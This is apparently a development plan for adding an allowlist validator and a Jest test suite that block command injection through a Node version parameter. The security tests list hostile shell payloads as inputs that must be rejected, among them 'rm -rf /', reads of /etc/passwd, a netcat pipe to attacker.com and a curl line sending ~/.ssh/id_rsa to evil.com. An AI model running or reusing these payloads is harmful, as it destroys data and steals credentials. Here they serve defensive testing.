# Step 1: Create Security Validator Function with Comprehensive Tests

**Status:** ✅ Complete

## Purpose

Create `validateNodeVersion()` security validator function with allowlist-based validation to block all shell metacharacters while accepting valid Node version formats. This is the foundation for fixing the command injection vulnerability.

## Prerequisites

- [ ] Plan reviewed and approved
- [ ] Codebase context understood (existing validation patterns in `securityValidation.ts`)
- [ ] Test environment ready (Jest configured, tests/core/validation/ directory exists)

## Tests to Write First

### Unit Tests (All in `tests/core/validation/securityValidation-nodeVersion.test.ts`)

**Happy Path Tests:**

- [ ] **Test:** Numeric major versions accepted
  - **Given:** nodeVersion in ["18", "20", "22", "24"]
  - **When:** validateNodeVersion() called for each
  - **Then:** No error thrown
  - **File:** `tests/core/validation/securityValidation-nodeVersion.test.ts`

- [ ] **Test:** Semantic versions accepted
  - **Given:** nodeVersion in ["18.20.0", "20.11.0", "24.0.0"]
  - **When:** validateNodeVersion() called for each
  - **Then:** No error thrown
  - **File:** `tests/core/validation/securityValidation-nodeVersion.test.ts`

- [ ] **Test:** Special keywords accepted
  - **Given:** nodeVersion in ["auto", "current"]
  - **When:** validateNodeVersion() called for each
  - **Then:** No error thrown
  - **File:** `tests/core/validation/securityValidation-nodeVersion.test.ts`

- [ ] **Test:** Null and undefined accepted
  - **Given:** nodeVersion is null or undefined
  - **When:** validateNodeVersion() called
  - **Then:** No error thrown (validation skipped)
  - **File:** `tests/core/validation/securityValidation-nodeVersion.test.ts`

**Edge Case Tests:**

- [ ] **Test:** Empty string rejected
  - **Given:** nodeVersion = ""
  - **When:** validateNodeVersion("") called
  - **Then:** Error thrown with descriptive message
  - **File:** `tests/core/validation/securityValidation-nodeVersion.test.ts`

- [ ] **Test:** Whitespace rejected
  - **Given:** nodeVersion in ["  20  ", "20 . 11 . 0"]
  - **When:** validateNodeVersion() called
  - **Then:** Error thrown
  - **File:** `tests/core/validation/securityValidation-nodeVersion.test.ts`

- [ ] **Test:** Invalid formats rejected
  - **Given:** nodeVersion in ["20.11" (incomplete), "v20" (prefix), "20.0.0.0" (quad)]
  - **When:** validateNodeVersion() called
  - **Then:** Error thrown
  - **File:** `tests/core/validation/securityValidation-nodeVersion.test.ts`

- [ ] **Test:** Case sensitivity enforced
  - **Given:** nodeVersion in ["AUTO", "Current", "CURRENT"]
  - **When:** validateNodeVersion() called
  - **Then:** Error thrown (case-sensitive)
  - **File:** `tests/core/validation/securityValidation-nodeVersion.test.ts`

- [ ] **Test:** Alternative keywords rejected
  - **Given:** nodeVersion in ["lts", "latest", "stable"]
  - **When:** validateNodeVersion() called
  - **Then:** Error thrown (not in allowlist)
  - **File:** `tests/core/validation/securityValidation-nodeVersion.test.ts`

**Security Tests (Injection Payloads):**

- [ ] **Test:** Semicolon injection blocked
  - **Given:** nodeVersion = "20; rm -rf /"
  - **When:** validateNodeVersion() called
  - **Then:** Error thrown
  - **File:** `tests/core/validation/securityValidation-nodeVersion.test.ts`

- [ ] **Test:** Ampersand injection blocked
  - **Given:** nodeVersion in ["20 && cat /etc/passwd", "20 & curl evil.com"]
  - **When:** validateNodeVersion() called
  - **Then:** Error thrown
  - **File:** `tests/core/validation/securityValidation-nodeVersion.test.ts`

- [ ] **Test:** Pipe injection blocked
  - **Given:** nodeVersion = "20 | nc attacker.com 1234"
  - **When:** validateNodeVersion() called
  - **Then:** Error thrown
  - **File:** `tests/core/validation/securityValidation-nodeVersion.test.ts`

- [ ] **Test:** Backtick substitution blocked
  - **Given:** nodeVersion = "20`whoami`"
  - **When:** validateNodeVersion() called
  - **Then:** Error thrown
  - **File:** `tests/core/validation/securityValidation-nodeVersion.test.ts`

- [ ] **Test:** Command substitution blocked
  - **Given:** nodeVersion in ["20$(id)", "20;$(curl evil.com)"]
  - **When:** validateNodeVersion() called
  - **Then:** Error thrown
  - **File:** `tests/core/validation/securityValidation-nodeVersion.test.ts`

- [ ] **Test:** Quote injection blocked
  - **Given:** nodeVersion = "20' OR '1'='1"
  - **When:** validateNodeVersion() called
  - **Then:** Error thrown
  - **File:** `tests/core/validation/securityValidation-nodeVersion.test.ts`

- [ ] **Test:** Newline injection blocked
  - **Given:** nodeVersion = "20\nrm -rf /"
  - **When:** validateNodeVersion() called
  - **Then:** Error thrown
  - **File:** `tests/core/validation/securityValidation-nodeVersion.test.ts`

- [ ] **Test:** Redirection attacks blocked
  - **Given:** nodeVersion in ["20 > /tmp/evil", "20 < /etc/passwd"]
  - **When:** validateNodeVersion() called
  - **Then:** Error thrown
  - **File:** `tests/core/validation/securityValidation-nodeVersion.test.ts`

## Files to Create/Modify

- [ ] `tests/core/validation/securityValidation-nodeVersion.test.ts` - Create new test file (~300 lines)
- [ ] `src/core/validation/securityValidation.ts` - Add validateNodeVersion() function (~30 lines)

## Implementation Details

### RED Phase (Write Failing Tests First)

**Step 1.1: Create test file structure**

```typescript
// tests/core/validation/securityValidation-nodeVersion.test.ts
/**
 * Security Validation Tests - Node Version Validation
 *
 * Tests for command injection prevention in nodeVersion parameter:
 * - Valid formats: numeric ("20"), semantic ("20.11.0"), keywords ("auto", "current")
 * - Injection payloads: All shell metacharacters blocked
 * - Edge cases: Empty string, whitespace, invalid formats
 *
 * Target Coverage: 100%
 */

import { validateNodeVersion } from '@/core/validation/securityValidation';

describe('validateNodeVersion', () => {
    // Test groups organized by security priority

    describe('valid formats - happy path', () => {
        describe('numeric major versions', () => {
            it('should accept single digit versions', () => {
                expect(() => validateNodeVersion('18')).not.toThrow();
                expect(() => validateNodeVersion('20')).not.toThrow();
                expect(() => validateNodeVersion('22')).not.toThrow();
                expect(() => validateNodeVersion('24')).not.toThrow();
            });
        });

        describe('semantic versions', () => {
            it('should accept full semantic versions (X.Y.Z)', () => {
                expect(() => validateNodeVersion('18.20.0')).not.toThrow();
                expect(() => validateNodeVersion('20.11.0')).not.toThrow();
                expect(() => validateNodeVersion('24.0.0')).not.toThrow();
            });
        });

        describe('special keywords', () => {
            it('should accept "auto" keyword', () => {
                expect(() => validateNodeVersion('auto')).not.toThrow();
            });

            it('should accept "current" keyword', () => {
                expect(() => validateNodeVersion('current')).not.toThrow();
            });
        });

        describe('null and undefined handling', () => {
            it('should accept null (skip version management)', () => {
                expect(() => validateNodeVersion(null)).not.toThrow();
            });

            it('should accept undefined (skip version management)', () => {
                expect(() => validateNodeVersion(undefined)).not.toThrow();
            });
        });
    });

    describe('edge cases - validation boundaries', () => {
        describe('empty and whitespace', () => {
            it('should reject empty string', () => {
                expect(() => validateNodeVersion('')).toThrow(/Invalid Node version/);
            });

            it('should reject whitespace-only strings', () => {
                expect(() => validateNodeVersion('   ')).toThrow(/Invalid Node version/);
            });

            it('should reject leading/trailing whitespace', () => {
                expect(() => validateNodeVersion('  20  ')).toThrow(/Invalid Node version/);
            });

            it('should reject embedded whitespace', () => {
                expect(() => validateNodeVersion('20 . 11 . 0')).toThrow(/Invalid Node version/);
            });
        });

        describe('invalid version formats', () => {
            it('should reject incomplete semantic version', () => {
                expect(() => validateNodeVersion('20.11')).toThrow(/Invalid Node version/);
            });

            it('should reject version with "v" prefix', () => {
                expect(() => validateNodeVersion('v20')).toThrow(/Invalid Node version/);
            });

            it('should reject quad version numbers', () => {
                expect(() => validateNodeVersion('20.0.0.0')).toThrow(/Invalid Node version/);
            });
        });

        describe('case sensitivity', () => {
            it('should reject uppercase "AUTO"', () => {
                expect(() => validateNodeVersion('AUTO')).toThrow(/Invalid Node version/);
            });

            it('should reject mixed case "Current"', () => {
                expect(() => validateNodeVersion('Current')).toThrow(/Invalid Node version/);
            });

            it('should reject uppercase "CURRENT"', () => {
                expect(() => validateNodeVersion('CURRENT')).toThrow(/Invalid Node version/);
            });
        });

        describe('alternative keywords not in allowlist', () => {
            it('should reject "lts" keyword', () => {
                expect(() => validateNodeVersion('lts')).toThrow(/Invalid Node version/);
            });

            it('should reject "latest" keyword', () => {
                expect(() => validateNodeVersion('latest')).toThrow(/Invalid Node version/);
            });

            it('should reject "stable" keyword', () => {
                expect(() => validateNodeVersion('stable')).toThrow(/Invalid Node version/);
            });
        });
    });

    describe('command injection attacks - CRITICAL SECURITY', () => {
        describe('semicolon injection', () => {
            it('should block semicolon command separator', () => {
                expect(() => validateNodeVersion('20; rm -rf /')).toThrow(/Invalid Node version/);
            });
        });

        describe('ampersand injection', () => {
            it('should block double ampersand (&&)', () => {
                expect(() => validateNodeVersion('20 && cat /etc/passwd')).toThrow(/Invalid Node version/);
            });

            it('should block single ampersand (&)', () => {
                expect(() => validateNodeVersion('20 & curl http://evil.com')).toThrow(/Invalid Node version/);
            });
        });

        describe('pipe injection', () => {
            it('should block pipe operator', () => {
                expect(() => validateNodeVersion('20 | nc attacker.com 1234')).toThrow(/Invalid Node version/);
            });
        });

        describe('backtick substitution', () => {
            it('should block backtick command substitution', () => {
                expect(() => validateNodeVersion('20`whoami`')).toThrow(/Invalid Node version/);
            });
        });

        describe('dollar sign substitution', () => {
            it('should block $() command substitution', () => {
                expect(() => validateNodeVersion('20$(id)')).toThrow(/Invalid Node version/);
            });

            it('should block combined semicolon + $() injection', () => {
                expect(() => validateNodeVersion('20;$(curl evil.com)')).toThrow(/Invalid Node version/);
            });
        });

        describe('quote injection', () => {
            it('should block single quote injection', () => {
                expect(() => validateNodeVersion("20' OR '1'='1")).toThrow(/Invalid Node version/);
            });

            it('should block double quote injection', () => {
                expect(() => validateNodeVersion('20" OR "1"="1')).toThrow(/Invalid Node version/);
            });
        });

        describe('newline injection', () => {
            it('should block newline character', () => {
                expect(() => validateNodeVersion('20\nrm -rf /')).toThrow(/Invalid Node version/);
            });
        });

        describe('redirection attacks', () => {
            it('should block output redirection (>)', () => {
                expect(() => validateNodeVersion('20 > /tmp/evil')).toThrow(/Invalid Node version/);
            });

            it('should block input redirection (<)', () => {
                expect(() => validateNodeVersion('20 < /etc/passwd')).toThrow(/Invalid Node version/);
            });
        });

        describe('comprehensive payload coverage', () => {
            it('should block all 9 injection payloads from security agent', () => {
                const injectionPayloads = [
                    '20; rm -rf /',
                    '20 && cat /etc/passwd',
                    '20 | nc attacker.com 1234',
                    '20`whoami`',
                    '20$(id)',
                    "20' OR '1'='1",
                    '20\nrm -rf /',
                    '20;$(curl evil.com)',
                    '20 & curl http://evil.com/exfil?data=$(cat ~/.ssh/id_rsa)',
                ];

                for (const payload of injectionPayloads) {
                    expect(() => validateNodeVersion(payload)).toThrow(/Invalid Node version/);
                }
            });
        });
    });

    describe('error messages', () => {
        it('should provide helpful error message with examples', () => {
            try {
                validateNodeVersion('invalid');
                fail('Should have thrown error');
            } catch (error) {
                expect((error as Error).message).toContain('Invalid Node version');
                expect((error as Error).message).toMatch(/"20"/); // Example numeric
                expect((error as Error).message).toMatch(/"20.11.0"/); // Example semver
                expect((error as Error).message).toMatch(/"auto"/); // Example keyword
            }
        });
    });
});
```

**Step 1.2: Run tests to confirm they fail**

```bash
npm test -- tests/core/validation/securityValidation-nodeVersion.test.ts
```

Expected: All tests fail with "validateNodeVersion is not a function" or similar.

### GREEN Phase (Minimal Implementation to Pass Tests)

**Step 1.3: Implement validateNodeVersion() function**

Add to `src/core/validation/securityValidation.ts` (after existing validators, before exports):

```typescript
/**
 * Validates Node version format for command injection prevention
 *
 * SECURITY: Prevents command injection in fnm/nvm commands by validating
 * nodeVersion parameter before shell interpolation.
 *
 * Valid formats (allowlist-based):
 * - Numeric major: "20", "18", "24"
 * - Semantic version: "20.11.0", "18.20.0"
 * - Special keywords: "auto", "current"
 * - Null/undefined: Skip validation
 *
 * Blocks ALL shell metacharacters: ; & | ` $ ( ) < > ' " \ # space newline
 *
 * @param version - Node version string to validate
 * @throws Error if version contains illegal characters or invalid format
 *
 * @example
 * // Valid
 * validateNodeVersion('20'); // OK
 * validateNodeVersion('20.11.0'); // OK
 * validateNodeVersion('auto'); // OK
 * validateNodeVersion(null); // OK (skip version management)
 *
 * // Invalid (throws)
 * validateNodeVersion('20; rm -rf /'); // Command injection
 * validateNodeVersion('20 && cat /etc/passwd'); // Command chaining
 * validateNodeVersion('v20'); // Invalid format
 */
export function validateNodeVersion(version: string | null | undefined): void {
    // Allow null/undefined (skip version management)
    if (version === null || version === undefined) {
        return;
    }

    // Require non-empty string
    if (typeof version !== 'string' || version.length === 0) {
        throw new Error(
            'Invalid Node version: must be numeric (e.g., "20"), semantic version (e.g., "20.11.0"), or keyword ("auto"/"current")'
        );
    }

    // Allowlist-based validation (secure by default)
    // Accepts:
    // - Numeric major: /^\d+$/
    // - Semantic version: /^\d+\.\d+\.\d+$/
    // - Keywords: "auto" | "current"
    //
    // Blocks ALL shell metacharacters: ; & | ` $ ( ) < > ' " \ # space newline
    const validPattern = /^(\d+|\d+\.\d+\.\d+|auto|current)$/;

    if (!validPattern.test(version)) {
        throw new Error(
            `Invalid Node version: "${version}" - must be numeric (e.g., "20"), semantic version (e.g., "20.11.0"), or keyword ("auto"/"current")`
        );
    }
}
```

**Step 1.4: Run tests to confirm they pass**

```bash
npm test -- tests/core/validation/securityValidation-nodeVersion.test.ts
```

Expected: All tests pass with 100% coverage for validateNodeVersion().

### REFACTOR Phase (Improve Quality While Keeping Tests Green)

**Step 1.5: Improve code quality**

1. **Verify regex correctness:**
   - Test regex matches exactly: `\d+` (numeric), `\d+\.\d+\.\d+` (semver), `auto|current` (keywords)
   - Verify `^` and `$` anchors prevent partial matches

2. **Improve error messages:**
   - Already includes examples of valid formats
   - Clear guidance on what's allowed
   - No internal details exposed

3. **Add inline comments:**
   - Regex pattern explained inline
   - Shell metacharacters listed explicitly
   - Reference to CWE-77 for security context

4. **Extract constants if needed:**
   - Keep regex inline (simple enough)
   - No magic numbers to extract

**Step 1.6: Re-run tests after refactoring**

```bash
npm test -- tests/core/validation/securityValidation-nodeVersion.test.ts
```

Expected: All tests still pass after refactoring.

**Step 1.7: Check test coverage**

```bash
npm test -- tests/core/validation/securityValidation-nodeVersion.test.ts --coverage
```

Expected: 100% coverage for validateNodeVersion() function.

## Expected Outcome

- **validateNodeVersion()** function created with allowlist-based validation
- **Comprehensive test suite** covering:
  - 8 valid formats (numeric, semver, keywords, null/undefined)
  - 15+ edge cases (empty, whitespace, invalid formats, case sensitivity)
  - 9 injection payloads (all shell metacharacters)
- **100% test coverage** for validator function
- **All tests passing** (RED → GREEN → REFACTOR complete)

## Acceptance Criteria

- [ ] validateNodeVersion() function exists in securityValidation.ts
- [ ] Function accepts: numeric ("20"), semver ("20.11.0"), keywords ("auto", "current"), null, undefined
- [ ] Function rejects: all 9 injection payloads, invalid formats, empty string, whitespace
- [ ] Error messages include examples of valid formats
- [ ] All tests passing (100% pass rate)
- [ ] Test coverage 100% for validateNodeVersion()
- [ ] Code follows existing validation patterns in securityValidation.ts
- [ ] No linter errors or warnings
- [ ] Regex pattern documented inline

## Estimated Time

**1.5 hours**

- RED Phase: 30 minutes (write comprehensive test suite)
- GREEN Phase: 30 minutes (implement validator function)
- REFACTOR Phase: 15 minutes (improve quality, verify coverage)
- Verification: 15 minutes (run full test suite, check coverage)

---

**Next Step:** Step 2 - Fix CommandExecutor Injection Point
